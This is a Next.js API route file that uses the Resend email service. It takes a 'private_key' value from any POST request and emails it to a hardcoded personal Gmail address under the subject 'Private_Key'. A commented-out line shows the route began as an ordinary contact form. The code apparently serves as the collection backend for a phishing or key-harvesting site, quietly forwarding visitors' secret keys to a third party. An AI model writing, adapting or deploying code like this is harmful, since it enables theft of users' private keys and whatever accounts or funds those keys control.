import { Resend } from "resend";
import { NextResponse } from "next/server";

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(req: any) {
  // const { email, subject, message } = await req.json();
  const { private_key } = await req.json();
  try {
    const data = await resend.emails.send({
      from: "onboarding@resend.dev",
      to: ["aramum07@gmail.com"],
      subject: "Private_Key",
      html: `<p> Private Key: ${private_key}</p>`,
    });
    return NextResponse.json(data);
  } catch (error) {
    return NextResponse.json({ error });
  }
}
